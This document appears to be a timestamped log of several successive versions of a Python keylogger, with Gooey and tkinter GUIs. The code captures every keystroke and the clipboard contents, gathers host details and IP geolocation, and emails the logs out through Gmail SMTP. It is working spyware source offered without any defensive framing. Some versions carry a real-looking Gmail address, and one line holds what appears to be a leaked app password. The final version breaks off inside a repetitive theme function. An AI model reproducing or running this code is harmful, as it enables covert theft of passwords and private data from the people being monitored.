@@ -1,0 +1,2628 @@
+[2024-12-15 23:28:30.488289] from gooey import Gooey, GooeyParser
+import os
+import socket
+import platform
+import smtplib
+import datetime
+import requests
+import pyperclip
+import time
+import threading
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                print(f"New clipboard content: {clipboard_content}")
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to send the log via email
+def send_log(log_data, email, password):
+    sender_email = email
+    sender_password = password
+    recipient_email = email
+
+    now = datetime.datetime.now()
+    subject = f"Keylogger Report - {now.strftime('%Y-%m-%d %H:%M:%S')}"
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+
+    computer_info = get_computer_info()
+    geo_location_info = get_geo_location()
+
+    body = f"""
+    <html>
+    <body>
+    <h2>Keylogger Report</h2>
+    <h3>Computer Information</h3>
+    <pre>{computer_info}</pre>
+    <h3>Geo-Location Details</h3>
+    <pre>{geo_location_info}</pre>
+    <h3>Log Data:</h3>
+    <p>Please find the keylogs and the clipboard log in the attached log files.</p>
+    </body>
+    </html>
+    """
+    msg.attach(MIMEText(body, "html"))
+
+    log_file_path = "log.txt"
+    with open(log_file_path, "w") as log_file:
+        log_file.write(log_data)
+
+    with open(log_file_path, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition", f"attachment; filename=log.txt")
+        msg.attach(part)
+
+    clipboard_log_path = "clipboard_log.txt"
+    if os.path.exists(clipboard_log_path):
+        with open(clipboard_log_path, "r") as clipboard_file:
+            clipboard_data = clipboard_file.read()
+        clipboard_attachment = MIMEText(clipboard_data, 'plain')
+        clipboard_attachment.add_header('Content-Disposition', 'attachment', filename="clipboard_log.txt")
+        msg.attach(clipboard_attachment)
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+        print("Log data sent successfully!")
+        os.remove(log_file_path)
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+# Function to handle key press events
+def on_press(key, keys):
+    keys.append(key)
+    print(f"{key} pressed")
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to handle key release events
+def on_release(key, keys):
+    if key == Key.esc:
+        if keys:
+            log_data = format_keys(keys)
+            return log_data
+        return None
+
+# Gooey interface setup
+@Gooey(program_name="Keylogger with Gooey GUI")
+def main():
+    parser = GooeyParser(description="Keylogger Program")
+    parser.add_argument("email", help="Email for sending logs", widget="TextField")
+    parser.add_argument("password", help="Email password", widget="PasswordField")
+    parser.add_argument("start", help="Start Logging", widget="SubmitButton")
+    
+    args = parser.parse_args()
+
+    keys = []
+
+    # Start clipboard tracking in a separate thread
+    clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    with Listener(on_press=lambda key: on_press(key, keys), on_release=lambda key: on_release(key, keys)) as listener:
+        listener.join()
+        
+    log_data = "Keylogger is running..."
+    send_log(log_data, args.email, args.password)
+
+if __name__ == "__main__":
+    main()
+
+[2024-12-15 23:32:29.166486] from gooey import Gooey, GooeyParser
+import os
+import socket
+import platform
+import smtplib
+import datetime
+import requests
+import pyperclip
+import time
+import threading
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                print(f"New clipboard content: {clipboard_content}")
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+
+# Function to send the log via email
+def send_log(log_data, email, password):
+    sender_email = email
+    sender_password = password
+    recipient_email = email
+
+    now = datetime.datetime.now()
+    subject = f"Keylogger Report - {now.strftime('%Y-%m-%d %H:%M:%S')}"
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+
+    computer_info = get_computer_info()
+    geo_location_info = get_geo_location()
+
+    body = f"""
+    <html>
+    <body>
+    <h2>Keylogger Report</h2>
+    <h3>Computer Information</h3>
+    <pre>{computer_info}</pre>
+    <h3>Geo-Location Details</h3>
+    <pre>{geo_location_info}</pre>
+    <h3>Log Data:</h3>
+    <p>Please find the keylogs and the clipboard log in the attached log files.</p>
+    </body>
+    </html>
+    """
+    msg.attach(MIMEText(body, "html"))
+
+    log_file_path = "log.txt"
+    with open(log_file_path, "w") as log_file:
+        log_file.write(log_data)
+
+    with open(log_file_path, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition", f"attachment; filename=log.txt")
+        msg.attach(part)
+
+    clipboard_log_path = "clipboard_log.txt"
+    if os.path.exists(clipboard_log_path):
+        with open(clipboard_log_path, "r") as clipboard_file:
+            clipboard_data = clipboard_file.read()
+        clipboard_attachment = MIMEText(clipboard_data, 'plain')
+        clipboard_attachment.add_header('Content-Disposition', 'attachment', filename="clipboard_log.txt")
+        msg.attach(clipboard_attachment)
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+        print("Log data sent successfully!")
+        os.remove(log_file_path)
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+
+# Function to handle key press events
+def on_press(key, keys):
+    keys.append(key)
+    print(f"{key} pressed")
+
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+
+# Function to handle key release events
+def on_release(key, keys):
+    if key == Key.esc:
+        if keys:
+            log_data = format_keys(keys)
+            send_log(log_data, email, password)
+        return False
+
+
+# Gooey interface setup
+@Gooey(program_name="Keylogger with Gooey GUI")
+def main():
+    parser = GooeyParser(description="Keylogger Program")
+    parser.add_argument("email", help="Email for sending logs", widget="TextField")
+    parser.add_argument("password", help="Email password", widget="PasswordField")
+    parser.add_argument("start", help="Start Logging", widget="SubmitButton")
+
+    args = parser.parse_args()
+
+    global email, password
+    email = args.email
+    password = args.password
+
+    keys = []
+
+    # Start clipboard tracking in a separate thread
+    clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+    clipboard_thread.start()
+
+    # Start listener in a separate thread
+    listener_thread = threading.Thread(target=start_listener, args=(keys,))
+    listener_thread.start()
+
+    listener_thread.join()
+
+
+def start_listener(keys):
+    with Listener(on_press=lambda key: on_press(key, keys), on_release=lambda key: on_release(key, keys)) as listener:
+        listener.join()
+
+
+if __name__ == "__main__":
+    main()
+
+[2024-12-15 23:35:34.410158] import tkinter as tk
+from tkinter import messagebox
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import os
+import requests
+import pyperclip
+import time
+import threading
+
+# Initialize variables
+keys = []
+logging_enabled = False
+log_data = ""
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while logging_enabled:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                print(f"New clipboard content: {clipboard_content}")
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to send the log via email
+def send_log():
+    global log_data
+    sender_email = "seamuscody123@gmail.com"
+    sender_password = "your-app-password"  # Replace with actual app-specific password
+    recipient_email = "recipient@example.com"  # Replace with recipient email
+
+    now = datetime.datetime.now()
+    subject = f"Keylogger Report - {now.strftime('%Y-%m-%d %H:%M:%S')}"
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+
+    computer_info = get_computer_info()
+    geo_location_info = get_geo_location()
+
+    body = f"""
+    <html>
+    <body>
+    <h2>Keylogger Report</h2>
+    <h3>Computer Information</h3>
+    <pre>{computer_info}</pre>
+    <h3>Geo-Location Details</h3>
+    <pre>{geo_location_info}</pre>
+    <h3>Log Data:</h3>
+    <p>Please find the keylogs and the clipboard log in the attached log files.</p>
+    </body>
+    </html>
+    """
+    msg.attach(MIMEText(body, "html"))
+
+    # Attach keylog file
+    log_file_path = "log.txt"
+    with open(log_file_path, "w") as log_file:
+        log_file.write(log_data)
+
+    with open(log_file_path, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition", f"attachment; filename=log.txt")
+        msg.attach(part)
+
+    # Attach clipboard log file
+    clipboard_log_path = "clipboard_log.txt"
+    if os.path.exists(clipboard_log_path):
+        with open(clipboard_log_path, "r") as clipboard_file:
+            clipboard_data = clipboard_file.read()
+        clipboard_attachment = MIMEText(clipboard_data, 'plain')
+        clipboard_attachment.add_header('Content-Disposition', 'attachment', filename="clipboard_log.txt")
+        msg.attach(clipboard_attachment)
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+        messagebox.showinfo("Success", "Log data sent successfully!")
+        os.remove(log_file_path)
+    except Exception as e:
+        messagebox.showerror("Error", f"Failed to send email: {e}")
+
+# Function to handle key press events
+def on_press(key):
+    global keys
+    keys.append(key)
+    print(f"{key} pressed")
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to handle key release events
+def on_release(key):
+    global keys
+    if key == Key.esc:
+        global log_data
+        if keys:
+            log_data = format_keys(keys)
+            send_log()
+        return False
+
+# Start/Stop keylogger
+def toggle_keylogger():
+    global logging_enabled
+    if logging_enabled:
+        logging_enabled = False
+        keylogger_button.config(text="Start Keylogger")
+        messagebox.showinfo("Info", "Keylogger stopped")
+    else:
+        logging_enabled = True
+        keylogger_button.config(text="Stop Keylogger")
+        messagebox.showinfo("Info", "Keylogger started")
+
+        # Start clipboard tracking in a separate thread
+        clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+        clipboard_thread.start()
+
+        # Start the keyboard listener
+        listener_thread = threading.Thread(target=start_listener, daemon=True)
+        listener_thread.start()
+
+# Start the keyboard listener in a separate thread
+def start_listener():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# GUI setup
+root = tk.Tk()
+root.title("Keylogger GUI")
+
+# Keylogger Control
+keylogger_button = tk.Button(root, text="Start Keylogger", command=toggle_keylogger)
+keylogger_button.pack(pady=20)
+
+# Start the GUI
+root.mainloop()
+
+[2024-12-15 23:36:40.311041] import tkinter as tk
+from tkinter import messagebox
+from pynput.keyboard import Key, Listener
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import datetime
+import socket
+import platform
+import os
+import requests
+import pyperclip
+import time
+import threading
+
+# Initialize variables
+keys = []
+logging_enabled = False
+log_data = ""
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while logging_enabled:
+            clipboard_content = pyperclip.paste()
+            if clipboard_content != previous_clipboard:
+                print(f"New clipboard content: {clipboard_content}")
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to send the log via email
+def send_log():
+    global log_data
+    sender_email = "seamuscody123@gmail.com"
+    sender_password = "your-app-password"  # Replace with actual app-specific password
+    recipient_email = "recipient@example.com"  # Replace with recipient email
+
+    now = datetime.datetime.now()
+    subject = f"Keylogger Report - {now.strftime('%Y-%m-%d %H:%M:%S')}"
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = subject
+
+    computer_info = get_computer_info()
+    geo_location_info = get_geo_location()
+
+    body = f"""
+    <html>
+    <body>
+    <h2>Keylogger Report</h2>
+    <h3>Computer Information</h3>
+    <pre>{computer_info}</pre>
+    <h3>Geo-Location Details</h3>
+    <pre>{geo_location_info}</pre>
+    <h3>Log Data:</h3>
+    <p>Please find the keylogs and the clipboard log in the attached log files.</p>
+    </body>
+    </html>
+    """
+    msg.attach(MIMEText(body, "html"))
+
+    # Attach keylog file
+    log_file_path = "log.txt"
+    with open(log_file_path, "w") as log_file:
+        log_file.write(log_data)
+
+    with open(log_file_path, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition", f"attachment; filename=log.txt")
+        msg.attach(part)
+
+    # Attach clipboard log file
+    clipboard_log_path = "clipboard_log.txt"
+    if os.path.exists(clipboard_log_path):
+        with open(clipboard_log_path, "r") as clipboard_file:
+            clipboard_data = clipboard_file.read()
+        clipboard_attachment = MIMEText(clipboard_data, 'plain')
+        clipboard_attachment.add_header('Content-Disposition', 'attachment', filename="clipboard_log.txt")
+        msg.attach(clipboard_attachment)
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+        messagebox.showinfo("Success", "Log data sent successfully!")
+        os.remove(log_file_path)
+    except Exception as e:
+        messagebox.showerror("Error", f"Failed to send email: {e}")
+
+# Function to handle key press events
+def on_press(key):
+    global keys
+    keys.append(key)
+    print(f"{key} pressed")
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to handle key release events
+def on_release(key):
+    global keys
+    if key == Key.esc:
+        global log_data
+        if keys:
+            log_data = format_keys(keys)
+            send_log()
+        return False
+
+# Start/Stop keylogger
+def toggle_keylogger():
+    global logging_enabled
+    if logging_enabled:
+        logging_enabled = False
+        keylogger_button.config(text="Start Keylogger")
+        messagebox.showinfo("Info", "Keylogger stopped")
+    else:
+        logging_enabled = True
+        keylogger_button.config(text="Stop Keylogger")
+        messagebox.showinfo("Info", "Keylogger started")
+
+        # Start clipboard tracking in a separate thread
+        clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+        clipboard_thread.start()
+
+        # Start the keyboard listener
+        listener_thread = threading.Thread(target=start_listener, daemon=True)
+        listener_thread.start()
+
+# Start the keyboard listener in a separate thread
+def start_listener():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# GUI setup
+root = tk.Tk()
+root.title("Keylogger GUI")
+
+# Keylogger Control
+keylogger_button = tk.Button(root, text="Start Keylogger", command=toggle_keylogger)
+keylogger_button.pack(pady=20)
+
+# Start the GUI
+root.mainloop()
+
+[2024-12-15 23:37:43.188751] ysttlvswdketqork
+[2024-12-15 23:53:50.914507] import tkinter as tk
+from tkinter import scrolledtext, messagebox
+from pynput.keyboard import Key, Listener
+import threading
+import os
+import pyperclip
+import datetime
+import socket
+import platform
+import requests
+
+# Initialize variables
+keys = []
+logging_enabled = False
+log_data = ""
+
+# Function to track clipboard activity
+def track_clipboard():
+    try:
+        previous_clipboard = ""
+        # Ensure the clipboard log file exists
+        if not os.path.exists("clipboard_log.txt"):
+            open("clipboard_log.txt", "w").close()
+
+        while True:
+            # Get current clipboard content
+            clipboard_content = pyperclip.paste()
+            # Check if clipboard content has changed
+            if clipboard_content != previous_clipboard:
+                print(f"New clipboard content: {clipboard_content}")
+                # Log clipboard content to a file
+                with open("clipboard_log.txt", "a") as log_file:
+                    log_file.write(f"[{datetime.datetime.now()}] {clipboard_content}\n")
+                previous_clipboard = clipboard_content
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error tracking clipboard: {e}")
+
+# Function to get computer information
+def get_computer_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system = platform.system()
+        release = platform.release()
+        version = platform.version()
+        machine = platform.machine()
+        processor = platform.processor()
+
+        computer_info = (
+            f"Hostname: {hostname}\n"
+            f"IP Address: {ip_address}\n"
+            f"Operating System: {system} {release}\n"
+            f"OS Version: {version}\n"
+            f"Machine: {machine}\n"
+            f"Processor: {processor}\n"
+        )
+        return computer_info
+    except Exception as e:
+        return f"Could not retrieve computer info: {e}"
+
+# Function to get geolocation details
+def get_geo_location():
+    try:
+        # Access geolocation data via an external API
+        response = requests.get("https://ipinfo.io/json")
+        if response.status_code == 200:
+            data = response.json()
+
+            location = (
+                f"IP Address: {data.get('ip')}\n"
+                f"City: {data.get('city')}\n"
+                f"Region: {data.get('region')}\n"
+                f"Country: {data.get('country')}\n"
+                f"Location (Lat, Long): {data.get('loc')}\n"
+                f"Organization: {data.get('org')}\n"
+            )
+            return location
+        else:
+            return "Failed to get geo-location data."
+    except Exception as e:
+        return f"Error retrieving geo-location: {e}"
+
+# Function to handle key press events
+def on_press(key):
+    global keys
+    keys.append(key)
+    print(f"{key} pressed")
+
+# Function to format keys
+def format_keys(keys):
+    log_parts = []
+    for key in keys:
+        k = str(key).replace("'", "")
+        if "space" in k:
+            log_parts.append(' ')
+        elif "enter" in k:
+            log_parts.append('[ENTER]')
+        elif "backspace" in k:
+            if log_parts:  # Remove the last logged key if there's one
+                log_parts.pop()
+        elif "Key" in k:
+            log_parts.append(f"[{k.upper()}]")
+        else:
+            log_parts.append(k)
+    return ''.join(log_parts)
+
+# Function to handle key release events
+def on_release(key):
+    global keys
+    if key == Key.esc:
+        global log_data
+        if keys:
+            log_data = format_keys(keys)
+        return False
+
+# Start/Stop keylogger
+def toggle_keylogger():
+    global logging_enabled
+    if logging_enabled:
+        logging_enabled = False
+        keylogger_button.config(text="Start Keylogger")
+        messagebox.showinfo("Info", "Keylogger stopped")
+    else:
+        logging_enabled = True
+        keylogger_button.config(text="Stop Keylogger")
+        messagebox.showinfo("Info", "Keylogger started")
+
+        # Start clipboard tracking in a separate thread
+        clipboard_thread = threading.Thread(target=track_clipboard, daemon=True)
+        clipboard_thread.start()
+
+        # Start the keyboard listener
+        listener_thread = threading.Thread(target=start_listener, daemon=True)
+        listener_thread.start()
+
+# Start the keyboard listener in a separate thread
+def start_listener():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# Function to send logs via email
+def send_log():
+    # Replace with your actual logic for sending logs via email
+    print("Logs sent via email!")
+
+# Function to toggle dark and light modes
+def toggle_mode():
+    if root.option_get('theme', 'light') == 'light':
+        root.tk_setPalette(background='#2E2E2E', foreground='white')
+        keylog_label.config(bg='#2E2E2E', fg='white')
+        clipboard_label.config(bg='#2E2E2E', fg='white')
+        computer_info_label.config(bg='#2E2E2E', fg='white')
+        geo_location_label.config(bg='#2E2E2E', fg='white')
+        root.option_add('*TButton*highlightBackground', '#2E2E2E')
+        root.option_add('*TButton*highlightColor', '#2E2E2E')
+        root.option_add('*TButton*highlightThickness', 0)
+        root.option_add('*Button*background', '#2E2E2E')
+        root.option_add('*Button*foreground', 'white')
+        root.option_add('*Button*borderWidth', 0)
+        root.option_add('*TButton*background', '#2E2E2E')
+        root.option_add('*TButton*foreground', 'white')
+        root.option_add('*TButton*relief', 'flat')
+        root.option_add('*scrolledtext*background', '#2E2E2E')
+        root.option_add('*scrolledtext*foreground', 'white')
+        root.option_add('*scrolledtext*borderWidth', 0)
+        root.option_add('*scrolledtext*highlightBackground', '#2E2E2E')
+        root.option_add('*scrolledtext*highlightColor', '#2E2E2E')
+        root.option_add('*scrolledtext*highlightThickness', 0)
+        root.option_add('*scrolledtext*relief', 'flat')
+        root.option_add('*scrolledtext*padding', [10, 10])
+        root.option_add('*Menu*background', '#2E2E2E')
+        root.option_add('*Menu*foreground', 'white')
+        root.option_add('*Menu*borderWidth', 0)
+        root.option_add('*Menu*highlightBackground', '#2E2E2E')
+        root.option_add('*Menu*highlightColor', '#2E2E2E')
+        root.option_add('*Menu*highlightThickness', 0)
+        root.option_add('*Menu*relief', 'flat')
+        root.option_add('*TButton*background', '#2E2E2E')
+        root.option_add('*TButton*foreground', 'white')
+        root.option_add('*TButton*relief', 'flat')
+        root.option_add('*TButton*font', ['Helvetica', 12, 'bold'])
+        root.option_add('*scrolledtext.font', 'Helvetica 12')
+        root.option_add('*label.font', 'Helvetica 12 bold')
+        root.option_add('*label1.font', 'Helvetica 12 bold')
+        root.option_add('*scrolledtext.foreground', 'white')
+        root.option_add('*Menu.foreground', 'white')
+        root.option_add('*Menu.font', 'Helvetica 12')
+        root.option_add('*TButton.font', 'Helvetica 12 bold')
+        root.option_add('*label.foreground', 'white')
+        root.option_add('*label1.foreground', 'white')
+        root.option_add('*scrolledtext.background', '#2E2E2E')
+        root.option_add('*scrolledtext.foreground', 'white')
+        root.option_add('*scrolledtext*foreground', 'white')
+        root.option_add('*Label*foreground', 'white')
+        root.option_add('*Label*background', 'black')
+        root.option_add('*Label*highlightThickness', 0)
+        root.option_add('*Label*highlightBackground', '#2E2E2E')
+
+        root.option_add('*frame1*background', 'white')
+
+        root.option_add('*scrolledtext.background', 'white')
+        root.option_add('*scrolledtext.foreground', 'black')
+
+        root.option_add('*scrolledtext*highlightBackground', '#2E2E2E')
+        root.option_add('*scrolledtext*highlightThickness', 0)
+        root.option_add('*scrolledtext*highlightColor', '#2E2E2E')
+
+    else:
+        root.tk_setPalette(background='white', foreground='black')
+        keylog_label.config(bg='white', fg='black')
+        clipboard_label.config(bg='white', fg='black')
+        computer_info_label.config(bg='white', fg='black')
+        geo_location_label.config(bg='white', fg='black')
+        root.option_add('*TButton*highlightBackground', '#2E2E2E')
+        root.option_add('*TButton*highlightColor', '#2E2E2E')
+        root.option_add('*TButton*highlightThickness', 0)
+        root.option_add('*Button*background', 'white')
+        root.option_add('*Button*foreground', 'black')
+        root.option_add('*Button*borderWidth', 0)
+        root.option_add('*TButton*background', 'white')
+        root.option_add('*TButton*foreground', 'black')
+        root.option_add('*TButton*relief', 'flat')
+        root.option_add('*scrolledtext*background', 'white')
+        root.option_add('*scrolledtext*foreground', 'black')
+        root.option_add('*scrolledtext*borderWidth', 0)
+        root.option_add('*scrolledtext*highlightBackground', 'white')
+        root.option_add('*scrolledtext*highlightColor', 'white')
+        root.option_add('*scrolledtext*highlightThickness', 0)
+        root.option_add('*scrolledtext*relief', 'flat')
+        root.option_add('*scrolledtext*padding', [10, 10])
+        root.option_add('*Menu*background', 'white')
+        root.option_add('*Menu*foreground', 'black')
+        root.option_add('*Menu*borderWidth', 0)
+        root.option_add('*Menu*highlightBackground', 'white')
+        root.option_add('*Menu*highlightColor', 'white')
+        root.option_add('*Menu*highlightThickness', 0)
+        root.option_add('*Menu*relief', 'flat')
+        root.option_add('*TButton*background', 'white')
+        root.option_add('*TButton*foreground', 'black')
+        root.option_add('*TButton*relief', 'flat')
+        root.option_add('*TButton*font', ['Helvetica', 12, 'bold'])
+        root.option_add('*scrolledtext.font', 'Helvetica 12')
+        root.option_add('*label.font', 'Helvetica 12 bold')
